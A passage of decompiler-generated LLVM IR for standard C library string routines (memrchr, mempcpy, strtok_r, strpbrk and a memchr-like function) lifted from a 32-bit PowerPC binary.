  store i32 %v1_10010ef8, i32* %r5.global-to-local, align 4
  %v1_10010efc = load i32, i32* %r4.global-to-local, align 4
  %v4_10010efc = icmp eq i32 %v3_10010ef4, %v1_10010efc
  %v0_10010f00 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010efc, i32 %v0_10010f00)
  %v0_10010f04 = load i32, i32* @r3, align 4
  %v1_10010f04 = add i32 %v0_10010f04, 1
  store i32 %v1_10010f04, i32* @r3, align 4
  %v0_10010f0c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010f0c = add i32 %v0_10010f0c, -1
  store i32 %v1_10010f0c, i32* %ctr.global-to-local, align 4
  %v2_10010f0c = icmp eq i32 %v1_10010f0c, 0
  br i1 %v2_10010f0c, label %dec_label_pc_10010f14.loopexit, label %dec_label_pc_10010f10

dec_label_pc_10010f10:                            ; preds = %entry, %dec_label_pc_10010ef4
  %v0_10010ef4 = phi i32 [ %v1_10010f04, %dec_label_pc_10010ef4 ], [ %v0_10010f087, %entry ]
  %v0_10010f10.in.in = phi i32 [ %v1_10010f04, %dec_label_pc_10010ef4 ], [ %v0_10010f087, %entry ]
  %v0_10010f10.in = urem i32 %v0_10010f10.in.in, 4
  %v0_10010f10 = icmp eq i32 %v0_10010f10.in, 0
  br i1 %v0_10010f10, label %dec_label_pc_10010f14.loopexit, label %dec_label_pc_10010ef4

dec_label_pc_10010f14.loopexit:                   ; preds = %dec_label_pc_10010f10, %dec_label_pc_10010ef4
  %v0_10010f3c16.ph = phi i32 [ %v1_10010f04, %dec_label_pc_10010ef4 ], [ %v0_10010ef4, %dec_label_pc_10010f10 ]
  %v0_10010f14.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10010f18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010f14

dec_label_pc_10010f14:                            ; preds = %dec_label_pc_10010f14.loopexit, %entry
  %v0_10010f18 = phi i32 [ 0, %entry ], [ %v0_10010f18.pre, %dec_label_pc_10010f14.loopexit ]
  %v0_10010f14 = phi i32 [ %v1_10010ee8, %entry ], [ %v0_10010f14.pre, %dec_label_pc_10010f14.loopexit ]
  %v0_10010f3c16 = phi i32 [ %v0_10010f087, %entry ], [ %v0_10010f3c16.ph, %dec_label_pc_10010f14.loopexit ]
  %v1_10010f14 = mul i32 %v0_10010f14, 256
  %v1_10010f18 = udiv i32 %v0_10010f18, 4
  %v2_10010f1c = or i32 %v1_10010f14, %v0_10010f14
  %v1_10010f24 = mul i32 %v2_10010f1c, 65536
  %v2_10010f30 = or i32 %v1_10010f24, %v2_10010f1c
  store i32 %v1_10010f18, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10010f18, 4
  br i1 %tmp, label %dec_label_pc_10010fc4, label %dec_label_pc_10010f3c

dec_label_pc_10010f3c:                            ; preds = %dec_label_pc_10010f14, %dec_label_pc_10010fc0.backedge
  %v0_10010fc0 = phi i32 [ %v1_10010fc0, %dec_label_pc_10010fc0.backedge ], [ %v1_10010f18, %dec_label_pc_10010f14 ]
  %v0_10010f44 = phi i32 [ %v1_10010f44, %dec_label_pc_10010fc0.backedge ], [ %v0_10010f18, %dec_label_pc_10010f14 ]
  %v0_10010f7c = phi i32 [ %v1_10010f40, %dec_label_pc_10010fc0.backedge ], [ %v0_10010f3c16, %dec_label_pc_10010f14 ]
  %v1_10010f3c = inttoptr i32 %v0_10010f7c to i32*
  %v2_10010f3c = load i32, i32* %v1_10010f3c, align 4
  %v1_10010f40 = add i32 %v0_10010f7c, 4
  store i32 %v1_10010f40, i32* @r3, align 4
  %v1_10010f44 = add i32 %v0_10010f44, -4
  store i32 %v1_10010f44, i32* %r5.global-to-local, align 4
  %v1_10010f48 = add i32 %v0_10010f7c, 1
  store i32 %v1_10010f48, i32* @r10, align 4
  %v2_10010f4c = xor i32 %v2_10010f3c, %v2_10010f30
  %v1_10010f54 = add i32 %v2_10010f4c, 2130640639
  %v2_10010f58 = xor i32 %v1_10010f54, %v2_10010f4c
  %v2_10010f5c = and i32 %v2_10010f58, -2130640640
  %v6_10010f5c = icmp eq i32 %v2_10010f5c, -2130640640
  br i1 %v6_10010f5c, label %dec_label_pc_10010fc0.backedge, label %dec_label_pc_10010f68

dec_label_pc_10010fc0.backedge:                   ; preds = %dec_label_pc_10010f3c, %dec_label_pc_10010fac
  %v1_10010fc0 = add i32 %v0_10010fc0, -1
  store i32 %v1_10010fc0, i32* %ctr.global-to-local, align 4
  %v2_10010fc0 = icmp eq i32 %v1_10010fc0, 0
  br i1 %v2_10010fc0, label %dec_label_pc_10010fc4, label %dec_label_pc_10010f3c

dec_label_pc_10010f68:                            ; preds = %dec_label_pc_10010f3c
  %v2_10010f68 = inttoptr i32 %v0_10010f7c to i8*
  %v3_10010f68 = load i8, i8* %v2_10010f68, align 1
  %v4_10010f68 = zext i8 %v3_10010f68 to i32
  %v1_10010f6c = add i32 %v0_10010f7c, 3
  store i32 %v1_10010f6c, i32* @r8, align 4
  %v1_10010f70 = add i32 %v0_10010f7c, 2
  %v4_10010f74 = icmp eq i32 %v4_10010f68, %v0_10010f14
  br i1 %v4_10010f74, label %dec_label_pc_10010f7c, label %dec_label_pc_10010f84

dec_label_pc_10010f7c:                            ; preds = %dec_label_pc_10010f68
  ret i32 %v0_10010f7c

dec_label_pc_10010f84:                            ; preds = %dec_label_pc_10010f68
  %v2_10010f84 = inttoptr i32 %v1_10010f48 to i8*
  %v3_10010f84 = load i8, i8* %v2_10010f84, align 1
  %v4_10010f84 = zext i8 %v3_10010f84 to i32
  %v4_10010f88 = icmp eq i32 %v4_10010f84, %v0_10010f14
  br i1 %v4_10010f88, label %dec_label_pc_10010f90, label %dec_label_pc_10010f98

dec_label_pc_10010f90:                            ; preds = %dec_label_pc_10010f84
  ret i32 %v1_10010f48

dec_label_pc_10010f98:                            ; preds = %dec_label_pc_10010f84
  %v2_10010f98 = inttoptr i32 %v1_10010f70 to i8*
  %v3_10010f98 = load i8, i8* %v2_10010f98, align 1
  %v4_10010f98 = zext i8 %v3_10010f98 to i32
  %v4_10010f9c = icmp eq i32 %v4_10010f98, %v0_10010f14
  br i1 %v4_10010f9c, label %dec_label_pc_10010fa4, label %dec_label_pc_10010fac

dec_label_pc_10010fa4:                            ; preds = %dec_label_pc_10010f98
  ret i32 %v1_10010f70

dec_label_pc_10010fac:                            ; preds = %dec_label_pc_10010f98
  %v2_10010fac = inttoptr i32 %v1_10010f6c to i8*
  %v3_10010fac = load i8, i8* %v2_10010fac, align 1
  %v4_10010fac = zext i8 %v3_10010fac to i32
  %v4_10010fb0 = icmp eq i32 %v4_10010fac, %v0_10010f14
  br i1 %v4_10010fb0, label %dec_label_pc_10010fb8, label %dec_label_pc_10010fc0.backedge

dec_label_pc_10010fb8:                            ; preds = %dec_label_pc_10010fac
  ret i32 %v1_10010f6c

dec_label_pc_10010fc4:                            ; preds = %dec_label_pc_10010fc0.backedge, %dec_label_pc_10010f14
  %v0_10010fd026 = phi i32 [ %v0_10010f3c16, %dec_label_pc_10010f14 ], [ %v1_10010f40, %dec_label_pc_10010fc0.backedge ]
  %v0_10010fc4 = phi i32 [ %v0_10010f18, %dec_label_pc_10010f14 ], [ %v1_10010f44, %dec_label_pc_10010fc0.backedge ]
  %v1_10010fc4 = add i32 %v0_10010fc4, 1
  store i32 %v1_10010fc4, i32* %r5.global-to-local, align 4
  store i32 %v0_10010fc4, i32* %ctr.global-to-local, align 4
  %v2_10010fe03 = icmp eq i32 %v0_10010fc4, 0
  br i1 %v2_10010fe03, label %dec_label_pc_10010fe4, label %dec_label_pc_10010fd0

dec_label_pc_10010fd0:                            ; preds = %dec_label_pc_10010fc4, %dec_label_pc_10010fd0.dec_label_pc_10010fd0_crit_edge
  %v1_10010fd4 = phi i32 [ %v1_10010fd4.pre, %dec_label_pc_10010fd0.dec_label_pc_10010fd0_crit_edge ], [ %v0_10010f14, %dec_label_pc_10010fc4 ]
  %v0_10010fd0 = phi i32 [ %v1_10010fdc, %dec_label_pc_10010fd0.dec_label_pc_10010fd0_crit_edge ], [ %v0_10010fd026, %dec_label_pc_10010fc4 ]
  %v1_10010fd0 = inttoptr i32 %v0_10010fd0 to i8*
  %v2_10010fd0 = load i8, i8* %v1_10010fd0, align 1
  %v3_10010fd0 = zext i8 %v2_10010fd0 to i32
  %v4_10010fd4 = icmp eq i32 %v3_10010fd0, %v1_10010fd4
  %v0_10010fd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10010fd4, i32 %v0_10010fd8)
  %v0_10010fdc = load i32, i32* @r3, align 4
  %v1_10010fdc = add i32 %v0_10010fdc, 1
  store i32 %v1_10010fdc, i32* @r3, align 4
  %v0_10010fe0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010fe0 = add i32 %v0_10010fe0, -1
  store i32 %v1_10010fe0, i32* %ctr.global-to-local, align 4
  %v2_10010fe0 = icmp eq i32 %v1_10010fe0, 0
  br i1 %v2_10010fe0, label %dec_label_pc_10010fe4, label %dec_label_pc_10010fd0.dec_label_pc_10010fd0_crit_edge

dec_label_pc_10010fd0.dec_label_pc_10010fd0_crit_edge: ; preds = %dec_label_pc_10010fd0
  %v1_10010fd4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010fd0

dec_label_pc_10010fe4:                            ; preds = %dec_label_pc_10010fd0, %dec_label_pc_10010fc4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10010fe0, { 1, 0 }
  uselistorder i32 %v1_10010fdc, { 1, 0 }
  uselistorder i32 %v0_10010fc4, { 1, 2, 0 }
  uselistorder i32 %v1_10010fc0, { 2, 1, 0 }
  uselistorder i32 %v1_10010f44, { 0, 2, 1 }
  uselistorder i32 %v1_10010f40, { 0, 2, 1 }
  uselistorder i32 %v0_10010f7c, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10010f1c, { 1, 0 }
  uselistorder i32 %v1_10010f18, { 1, 0 }
  uselistorder i32 %v0_10010f3c16, { 1, 0 }
  uselistorder i32 %v0_10010f14, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10010f18, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10010f0c, { 1, 0 }
  uselistorder i32 %v1_10010f04, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10010f087, { 2, 0, 1 }
  uselistorder i32 %v1_10010ee8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 5, 1, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10010fc0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10010f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10010f10, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268505096, i32* @lr, align 4
  %v0_10011004 = call i32 @memcpy()
  %v0_1001100c = load i32, i32* @r28, align 4
  %v1_1001100c = load i32, i32* @r29, align 4
  %v2_1001100c = add i32 %v1_1001100c, %v0_1001100c
  ret i32 %v2_1001100c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10011024 = urem i32 %arg2, 256
  store i32 %v1_10011024, i32* %r4.global-to-local, align 4
  %v2_1001102c = add i32 %arg3, %arg1
  store i32 %v2_1001102c, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1001104813 = icmp eq i32 %arg3, 0
  br i1 %v2_1001104813, label %dec_label_pc_10011050, label %dec_label_pc_1001104c

dec_label_pc_10011034:                            ; preds = %dec_label_pc_1001104c
  %v1_10011034 = add i32 %v0_10011034, -1
  %v2_10011034 = inttoptr i32 %v1_10011034 to i8*
  %v3_10011034 = load i8, i8* %v2_10011034, align 1
  %v4_10011034 = zext i8 %v3_10011034 to i32
  store i32 %v1_10011034, i32* %r3.global-to-local, align 4
  %v0_10011038 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011038 = add i32 %v0_10011038, -1
  store i32 %v1_10011038, i32* %r5.global-to-local, align 4
  %v1_1001103c = load i32, i32* %r4.global-to-local, align 4
  %v4_1001103c = icmp eq i32 %v4_10011034, %v1_1001103c
  %v0_10011040 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001103c, i32 %v0_10011040)
  %v0_10011044 = load i32, i32* %r3.global-to-local, align 4
  %v0_10011048 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011048 = add i32 %v0_10011048, -1
  store i32 %v1_10011048, i32* %ctr.global-to-local, align 4
  %v2_10011048 = icmp eq i32 %v1_10011048, 0
  br i1 %v2_10011048, label %dec_label_pc_10011050.loopexit, label %dec_label_pc_1001104c

dec_label_pc_1001104c:                            ; preds = %entry, %dec_label_pc_10011034
  %v0_10011034 = phi i32 [ %v0_10011044, %dec_label_pc_10011034 ], [ %v2_1001102c, %entry ]
  %v0_1001104c.in.in = phi i32 [ %v0_10011044, %dec_label_pc_10011034 ], [ %v2_1001102c, %entry ]
  %v0_1001104c.in = urem i32 %v0_1001104c.in.in, 4
  %v0_1001104c = icmp eq i32 %v0_1001104c.in, 0
  br i1 %v0_1001104c, label %dec_label_pc_10011050.loopexit, label %dec_label_pc_10011034

dec_label_pc_10011050.loopexit:                   ; preds = %dec_label_pc_1001104c, %dec_label_pc_10011034
  %v0_1001107816.ph = phi i32 [ %v0_10011044, %dec_label_pc_10011034 ], [ %v0_10011034, %dec_label_pc_1001104c ]
  %v0_10011050.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10011054.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011050

dec_label_pc_10011050:                            ; preds = %dec_label_pc_10011050.loopexit, %entry
  %v0_10011054 = phi i32 [ 0, %entry ], [ %v0_10011054.pre, %dec_label_pc_10011050.loopexit ]
  %v0_10011050 = phi i32 [ %v1_10011024, %entry ], [ %v0_10011050.pre, %dec_label_pc_10011050.loopexit ]
  %v0_1001107816 = phi i32 [ %v2_1001102c, %entry ], [ %v0_1001107816.ph, %dec_label_pc_10011050.loopexit ]
  %v1_10011050 = mul i32 %v0_10011050, 256
  %v1_10011054 = udiv i32 %v0_10011054, 4
  %v2_10011058 = or i32 %v1_10011050, %v0_10011050
  %v1_10011060 = mul i32 %v2_10011058, 65536
  %v2_1001106c = or i32 %v1_10011060, %v2_10011058
  store i32 %v2_1001106c, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_10011054, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10011054, 4
  br i1 %tmp, label %dec_label_pc_100110f0, label %dec_label_pc_10011078

dec_label_pc_10011078:                            ; preds = %dec_label_pc_10011050, %dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge
  %v0_100110ec21 = phi i32 [ %v1_100110ec, %dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge ], [ %v1_10011054, %dec_label_pc_10011050 ]
  %v0_10011098 = phi i32 [ %v0_10011098.pre, %dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge ], [ -2130640640, %dec_label_pc_10011050 ]
  %v0_10011080 = phi i32 [ %v0_10011080.pre, %dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge ], [ %v2_1001106c, %dec_label_pc_10011050 ]
  %v0_1001107c = phi i32 [ %v0_1001107c.pre, %dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge ], [ %v0_10011054, %dec_label_pc_10011050 ]
  %v0_10011078 = phi i32 [ %v0_10011078.pre, %dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge ], [ %v0_1001107816, %dec_label_pc_10011050 ]
  %v1_10011078 = add i32 %v0_10011078, -4
  %v2_10011078 = inttoptr i32 %v1_10011078 to i32*
  %v3_10011078 = load i32, i32* %v2_10011078, align 4
  store i32 %v1_10011078, i32* %r3.global-to-local, align 4
  %v1_1001107c = add i32 %v0_1001107c, -4
  store i32 %v1_1001107c, i32* %r5.global-to-local, align 4
  %v2_10011080 = xor i32 %v3_10011078, %v0_10011080
  %v1_10011084 = add i32 %v0_10011078, -3
  store i32 %v1_10011084, i32* @r10, align 4
  %v1_1001108c = add i32 %v2_10011080, 2130640639
  %v1_10011094 = add i32 %v0_10011078, -2
  %v2_10011090 = sub i32 -1, %v2_10011080
  %v2_10011098 = xor i32 %v1_1001108c, %v2_10011090
  %v3_10011098 = and i32 %v2_10011098, %v0_10011098
  %v6_10011098 = icmp eq i32 %v3_10011098, 0
  %v1_1001109c = add i32 %v0_10011078, -1
  br i1 %v6_10011098, label %dec_label_pc_100110ec.backedge, label %dec_label_pc_100110a4

dec_label_pc_100110a4:                            ; preds = %dec_label_pc_10011078
  %v2_100110a4 = inttoptr i32 %v1_1001109c to i8*
  %v3_100110a4 = load i8, i8* %v2_100110a4, align 1
  %v4_100110a4 = zext i8 %v3_100110a4 to i32
  %v1_100110a8 = load i32, i32* %r4.global-to-local, align 4
  %v4_100110a8 = icmp eq i32 %v4_100110a4, %v1_100110a8
  br i1 %v4_100110a8, label %dec_label_pc_100110b0, label %dec_label_pc_100110b8

dec_label_pc_100110b0:                            ; preds = %dec_label_pc_100110a4
  store i32 %v1_1001109c, i32* %r3.global-to-local, align 4
  ret i32 %v1_1001109c

dec_label_pc_100110b8:                            ; preds = %dec_label_pc_100110a4
  %v2_100110b8 = inttoptr i32 %v1_10011094 to i8*
  %v3_100110b8 = load i8, i8* %v2_100110b8, align 1
  %v4_100110b8 = zext i8 %v3_100110b8 to i32
  %v4_100110bc = icmp eq i32 %v4_100110b8, %v1_100110a8
  br i1 %v4_100110bc, label %dec_label_pc_100110c4, label %dec_label_pc_100110cc

dec_label_pc_100110c4:                            ; preds = %dec_label_pc_100110b8
  store i32 %v1_10011094, i32* %r3.global-to-local, align 4
  ret i32 %v1_10011094

dec_label_pc_100110cc:                            ; preds = %dec_label_pc_100110b8
  %v2_100110cc = inttoptr i32 %v1_10011084 to i8*
  %v3_100110cc = load i8, i8* %v2_100110cc, align 1
  %v4_100110cc = zext i8 %v3_100110cc to i32
  %v4_100110d0 = icmp eq i32 %v4_100110cc, %v1_100110a8
  br i1 %v4_100110d0, label %dec_label_pc_100110d8, label %dec_label_pc_100110e0

dec_label_pc_100110d8:                            ; preds = %dec_label_pc_100110cc
  store i32 %v1_10011084, i32* %r3.global-to-local, align 4
  ret i32 %v1_10011084

dec_label_pc_100110e0:                            ; preds = %dec_label_pc_100110cc
  %v1_100110e0 = inttoptr i32 %v1_10011078 to i8*
  %v2_100110e0 = load i8, i8* %v1_100110e0, align 1
  %v3_100110e0 = zext i8 %v2_100110e0 to i32
  %v4_100110e4 = icmp eq i32 %v3_100110e0, %v1_100110a8
  %v0_100110e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100110e4, i32 %v0_100110e8)
  %v0_100110ec.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100110ec.backedge

dec_label_pc_100110ec.backedge:                   ; preds = %dec_label_pc_100110e0, %dec_label_pc_10011078
  %v0_100110ec = phi i32 [ %v0_100110ec.pre, %dec_label_pc_100110e0 ], [ %v0_100110ec21, %dec_label_pc_10011078 ]
  %v1_100110ec = add i32 %v0_100110ec, -1
  store i32 %v1_100110ec, i32* %ctr.global-to-local, align 4
  %v2_100110ec = icmp eq i32 %v1_100110ec, 0
  br i1 %v2_100110ec, label %dec_label_pc_100110ec.dec_label_pc_100110f0_crit_edge, label %dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge

dec_label_pc_100110ec.backedge.dec_label_pc_10011078_crit_edge: ; preds = %dec_label_pc_100110ec.backedge
  %v0_10011078.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1001107c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10011080.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10011098.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10011078

dec_label_pc_100110ec.dec_label_pc_100110f0_crit_edge: ; preds = %dec_label_pc_100110ec.backedge
  %v0_100110f0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100110f0

dec_label_pc_100110f0:                            ; preds = %dec_label_pc_100110ec.dec_label_pc_100110f0_crit_edge, %dec_label_pc_10011050
  %v0_100110f0 = phi i32 [ %v0_100110f0.pre, %dec_label_pc_100110ec.dec_label_pc_100110f0_crit_edge ], [ %v0_10011054, %dec_label_pc_10011050 ]
  %v1_100110f0 = add i32 %v0_100110f0, 1
  store i32 %v1_100110f0, i32* %r5.global-to-local, align 4
  store i32 %v0_100110f0, i32* %ctr.global-to-local, align 4
  %v2_100111083 = icmp eq i32 %v0_100110f0, 0
  br i1 %v2_100111083, label %dec_label_pc_1001110c, label %dec_label_pc_100110fc

dec_label_pc_100110fc:                            ; preds = %dec_label_pc_100110f0, %dec_label_pc_100110fc
  %v0_100110fc = load i32, i32* %r3.global-to-local, align 4
  %v1_100110fc = add i32 %v0_100110fc, -1
  %v2_100110fc = inttoptr i32 %v1_100110fc to i8*
  %v3_100110fc = load i8, i8* %v2_100110fc, align 1
  %v4_100110fc = zext i8 %v3_100110fc to i32
  store i32 %v1_100110fc, i32* %r3.global-to-local, align 4
  %v1_10011100 = load i32, i32* %r4.global-to-local, align 4
  %v4_10011100 = icmp eq i32 %v4_100110fc, %v1_10011100
  %v0_10011104 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10011100, i32 %v0_10011104)
  %v0_10011108 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011108 = add i32 %v0_10011108, -1
  store i32 %v1_10011108, i32* %ctr.global-to-local, align 4
  %v2_10011108 = icmp eq i32 %v1_10011108, 0
  br i1 %v2_10011108, label %dec_label_pc_1001110c, label %dec_label_pc_100110fc

dec_label_pc_1001110c:                            ; preds = %dec_label_pc_100110fc, %dec_label_pc_100110f0
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10011108, { 1, 0 }
  uselistorder i32 %v0_100110f0, { 1, 2, 0 }
  uselistorder i32 %v1_100110ec, { 2, 1, 0 }
  uselistorder i32 %v1_1001109c, { 1, 0, 2 }
  uselistorder i32 %v1_10011094, { 1, 0, 2 }
  uselistorder i32 %v1_10011084, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10011058, { 1, 0 }
  uselistorder i32 %v1_10011054, { 1, 0 }
  uselistorder i32 %v0_10011050, { 1, 0 }
  uselistorder i32 %v0_10011054, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10011048, { 1, 0 }
  uselistorder i32 %v0_10011044, { 1, 0, 2 }
  uselistorder i32 %v2_1001102c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10011024, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 1, 6, 5, 2, 8, 7, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100110fc, { 1, 0 }
  uselistorder label %dec_label_pc_10011078, { 1, 0 }
  uselistorder label %dec_label_pc_1001104c, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10011118 = load i32, i32* @lr, align 4
  store i32 %v0_10011118, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10011120 = icmp eq i32 %arg1, 0
  %v0_10011128 = load i32, i32* @r5, align 4
  store i32 %v0_10011128, i32* %r30.global-to-local, align 4
  %v0_1001112c = load i32, i32* @r4, align 4
  store i32 %v0_1001112c, i32* %r29.global-to-local, align 4
  br i1 %v3_10011120, label %dec_label_pc_10011134, label %dec_label_pc_10011138

dec_label_pc_10011134:                            ; preds = %entry
  %v1_10011134 = inttoptr i32 %v0_10011128 to i32*
  %v2_10011134 = load i32, i32* %v1_10011134, align 4
  store i32 %v2_10011134, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011138

dec_label_pc_10011138:                            ; preds = %entry, %dec_label_pc_10011134
  %v0_10011138 = phi i32 [ %arg1, %entry ], [ %v2_10011134, %dec_label_pc_10011134 ]
  store i32 %v0_10011138, i32* @r3, align 4
  %v1_1001113c = inttoptr i32 %v0_10011138 to i8*
  %v2_1001113c = call i32 @__GI_strspn(i8* %v1_1001113c)
  %v0_10011140 = load i32, i32* %r29.global-to-local, align 4
  %v0_10011144 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011144 = add i32 %v0_10011144, %v2_1001113c
  %v3_10011144 = inttoptr i32 %v2_10011144 to i8*
  %v4_10011144 = load i8, i8* %v3_10011144, align 1
  store i32 %v2_10011144, i32* @r31, align 4
  store i32 %v2_10011144, i32* @r3, align 4
  %v3_10011150 = icmp eq i8 %v4_10011144, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10011150, label %dec_label_pc_1001115c, label %dec_label_pc_10011164

dec_label_pc_1001115c:                            ; preds = %dec_label_pc_10011138
  %v1_1001115c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001115c = inttoptr i32 %v1_1001115c to i32*
  store i32 %v2_10011144, i32* %v2_1001115c, align 4
  br label %dec_label_pc_1001119c

dec_label_pc_10011164:                            ; preds = %dec_label_pc_10011138
  store i32 268505448, i32* @lr, align 4
  %v3_10011164 = call i32 @__GI_strpbrk(i8* %v3_10011144, i32 %v0_10011140)
  %v4_1001116c = icmp eq i32 %v3_10011164, 0
  %v0_10011170 = load i32, i32* @r31, align 4
  store i32 %v0_10011170, i32* @r3, align 4
  %v2_10011174 = add i32 %v3_10011164, 1
  store i32 %v2_10011174, i32* %r11.global-to-local, align 4
  br i1 %v4_1001116c, label %dec_label_pc_1001117c, label %dec_label_pc_1001118c

dec_label_pc_1001117c:                            ; preds = %dec_label_pc_10011164
  store i32 268505472, i32* @lr, align 4
  %v4_1001117c = call i32 @rawmemchr(i32 %v0_10011170, i32 0, i32 0)
  %v0_10011180 = load i32, i32* @r31, align 4
  store i32 %v0_10011180, i32* %r0.global-to-local, align 4
  %v1_10011184 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011184 = inttoptr i32 %v1_10011184 to i32*
  store i32 %v4_1001117c, i32* %v2_10011184, align 4
  br label %dec_label_pc_1001119c

dec_label_pc_1001118c:                            ; preds = %dec_label_pc_10011164
  %v1_1001116c = inttoptr i32 %v3_10011164 to i8*
  store i8 0, i8* %v1_1001116c, align 1
  %v0_10011194 = load i32, i32* @r31, align 4
  store i32 %v0_10011194, i32* %r0.global-to-local, align 4
  %v0_10011198 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011198 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011198 = inttoptr i32 %v1_10011198 to i32*
  store i32 %v0_10011198, i32* %v2_10011198, align 4
  br label %dec_label_pc_1001119c

dec_label_pc_1001119c:                            ; preds = %dec_label_pc_1001117c, %dec_label_pc_1001115c, %dec_label_pc_1001118c
  %v0_1001119c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10011118, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001119c

; uselistorder directives
  uselistorder i32 %v3_10011164, { 2, 0, 1 }
  uselistorder i32 %v2_10011144, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10011138, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1001119c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011138, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100111d41 = load i32, i32* @r3, align 4
  %v1_100111d42 = inttoptr i32 %v0_100111d41 to i8*
  %v2_100111d43 = load i8, i8* %v1_100111d42, align 1
  %v3_100111d44 = zext i8 %v2_100111d43 to i32
  store i32 %v3_100111d44, i32* %r11.global-to-local, align 4
  %v3_100111d86 = icmp eq i8 %v2_100111d43, 0
  br i1 %v3_100111d86, label %dec_label_pc_100111e8, label %dec_label_pc_100111e0

dec_label_pc_100111b8:                            ; preds = %dec_label_pc_100111bc
  %v3_100111bc = zext i8 %v2_100111bc to i32
  %v4_100111c8 = icmp eq i32 %v3_100111bc, %v1_100111c8
  %v0_100111b8 = load i32, i32* @lr, align 4
